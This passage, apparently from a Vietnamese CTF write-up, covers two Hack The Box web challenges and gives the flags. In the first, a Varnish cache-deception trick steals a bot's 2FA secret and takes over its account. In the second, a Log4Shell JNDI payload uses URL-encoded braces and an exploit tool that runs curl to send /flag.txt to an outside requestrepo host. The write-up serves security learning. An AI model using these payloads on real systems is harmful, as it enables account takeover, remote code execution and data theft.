        set resp.http.X-Cache = "MISS";
    }

    set resp.http.X-Cache-Hits = obj.hits;
}
```
Subroutine `vcl_deliver` sử dụng để set header cho response. Ở đây chỉ đơn giản là set giá trị cho header `X-Cache` nếu được request lần đầu thì sẽ là `MISS`, những lần truy cập sau thì sẽ là `HIT`.

Vậy làm sao để khai thác nếu server đang chạy 1 caching service trên đó?

#### Ý tưởng
Trong trang `Settings` của người dùng có tính năng reset 2FA code tại `/reset-2fa` và được implement trong source code như sau:
```
router.get(/^\/(\w{2})?\/?(setup|reset)-2fa/, AuthMiddleware, async (req, res) => {
    let lang = req.params[0];
    if (!lang) lang = 'en';
    let otpkey = OTPHelper.genSecret();

    return db.setOTPKey(req.user.username, otpkey)
        .then(() => {
        return res.render(`${lang}/setup-2fa.html`, {otpkey: otpkey, action: req.params[1]});
        })
        .catch(err => {
            console.log(err);
            return res.status(500).send(response('Something went wrong!'));
        });
});
```
và response có chứa secret key của OTP dùng để tạo QR code:
```
<script>
    genQRCode('DBAF2YD5ERURKFQT');
</script>
```
Vì route này được xử lí bằng regex để matching và sử dụng `^` để match những kí tự bắt đầu chuỗi nên chỉ cần những kí tự bắt đầu chuỗi hợp lệ thì sẽ không quan tâm đến những kí tự phía sau, nhờ đó chúng ta có thể thêm `.js`, `.css` hay `.map` vào đằng sau để Varnish caching response của trang.
Ví dụ: `/reset-2fa.js`, `/reset-2fa.css` hay `/reset-2fa.map` đều được. Mình chọn `/reset-2fa.js` làm link để caching.

#### Exploit
Chúng ta cần cho bot truy cập vào 1 trong 3 link ở trên để Varnish caching response có chứa secret key của OTP, từ đó tạo được QR code và đăng nhập vào tài khoản của bot với username là `icarus`. Nghe hay đấy nhưng bằng cách nào?

Tại form chuyển tiền có hỗ trợ tính năng chèn hình ảnh vào note, ta có thể lợi dụng tính năng này để khi bot truy cập vào xem giao dịch thì sẽ tự động load ảnh (ở đây là sẽ load `http://127.0.0.1/reset-2fa.js`).

![Tạo link ảnh để bot truy cập](https://i.imgur.com/s73aTCy.png)

Xong khi bấm `Send` để chuyển tiền, tiến hành request vào `/reset-2fa.js` để lấy secret key. Sửa `Host` header thành `127.0.0.1` để matching, nếu không sửa sẽ không match với điều kiện được ghi trong `vcl_hash` và sẽ được yêu cầu đăng nhập như bình thường.

```
GET /reset-2fa.js HTTP/1.1
Host: 127.0.0.1
```

Sau khi có được secret key của OTP rồi thì tạo QR code, đăng nhập vào `icarus` (thông tin tài khoản trong file `database.js`), nhập 2FA code và chuyển hết tiền về wallet account của mình. Logout account `icarus`, login account của mình và vào `/dashboard` để lấy flag.

**Flag**: `HTB{Fl3w_t00_cl0s3_t0_7h3_d3cept10n_4nd_burn3d!}`

## CheckpointBots
Đoạn code gây ra lỗi cho bài này:
```
@GetMapping(value="/api/checkpointbot/check-in", produces="application/json")
    public ResponseEntity<String> handlerCheckIn(@RequestParam("token") String token) {

        Map<String, String> json = new HashMap<String, String>();
        CheckpointBot bot;

        try{
            UUID.fromString(token);
            bot = cRepo.findByToken(token).get(0);
        } catch (IllegalArgumentException exception){
            log.error("Invalid token supplied: " + token);
            json.put("message", "Invalid token supplied");
            return new ResponseEntity<String>(gson.toJson(json),HttpStatus.UNAUTHORIZED);
        }
```
- Người dùng có thể control được tham số `token`. Sau đó token được tìm kiếm trong list thông qua hàm `findByToken` và lấy token đầu tiên trong list. 
- Nếu như token không có, hoặc bị lỗi sẽ đưa `Invalid token supplied: ` + `token` người dùng đã nhập vào file log. Và trả về reponse ra màn hình `Invalid token supplied`.
```
@GetMapping("/api/checkpointbot/sheet")
public ResponseEntity<?> download(@RequestParam("token") String token) throws Exception {

    Map<String, String> json = new HashMap<String, String>();
    CheckpointBot bot;
    CheckInUtility checkInUtility;

    try{
        UUID.fromString(token);
    } catch (IllegalArgumentException exception){
        log.error("Invalid token supplied: " + token);
        json.put("message", "Invalid token supplied");
        return new ResponseEntity<String>(gson.toJson(json),HttpStatus.UNAUTHORIZED);
    }

    try{
        bot = cRepo.findByToken(token).get(0);
    } catch (Exception e){
        log.error("Invalid token supplied: " + token);
        json.put("message", "Invalid token supplied");
        return new ResponseEntity<String>(gson.toJson(json),HttpStatus.UNAUTHORIZED);
    }
```
- Ở `/api/checkpointbot/sheet` cũng check token nếu không nằm trong list thì sẽ ghi `token` mà người dùng nhập vào đó vào log.

File `pom.xml` cho biết được chương trình đang sử dụng log4j để lưu log:
```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
    <version>2.6.1</version>
    <exclusions>
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
    <version>2.6.1</version>
</dependency>
```
=> Ở đây có thể xảy ra RCE dựa vào lỗi của Log4j gần đây.
Thử test với payload đơn giản của Log4j:
```
${jndi:ldap://jzj0drqj.requestrepo.com/a}
```
- Nếu như có request DNS tới server của mình có nghĩ là đã trigger thành công.
- Nhưng sau ghi send payload trên thì HTTP status response trả về là `400`.

![Website trả về mã 400](https://i.imgur.com/vGPaF38.png)

- Sau khi check các char có trong payload thì thấy được kí tự `{`,`}` là nguyên nhân gây ra lỗi nên payload trên không thể chạy được.
- Ở đây mình thử URL encode 2 kí tự trên thì bypass được và có request tới host của mình.

![Request thành công với input của mình](https://i.imgur.com/qE7OH49.png)
![Có trigger DNS query request](https://i.imgur.com/7E8gHsX.png)

=> Đã trigger thành công lỗi Log4j.

Vậy bây giờ cần RCE để đọc flag vì flag nằm trong thư mục root.

### Exploit
Sử dụng công cụ [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar) tạo payload để RCE. Tiến hành tạo payload:
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl -X POST @/flag.txt http://14yo1kk2.requestrepo.com' -
A [YOUR_IP]
```
![Danh sách các payload mà tool tạo ra](https://i.imgur.com/0POPCu4.png)

Sẽ tạo ra 3 target để sử dụng nhưng vì mặc định `trustURLCodebase=false` nên sử dụng payload dành cho `trustURLCodebase is false`.

#### Payload
```
GET /api/checkpointbot/check-in?token=$%7Bjndi:rmi://[YOUR_IP]:1099/okrl6h%7D HTTP/1.1
Host: localhost:1337
Connection: close
```

Có thể send payload ở `/api/checkpointbot/check-in` hoặc `/api/checkpointbot/sheet` vì cả 2 đều xảy ra lỗi Log4j.

**Flag** : `HTB{l0g4j2_g4dg3t_ch4in_55t1_f0r_fun}`

---
*Written by taidh & son*.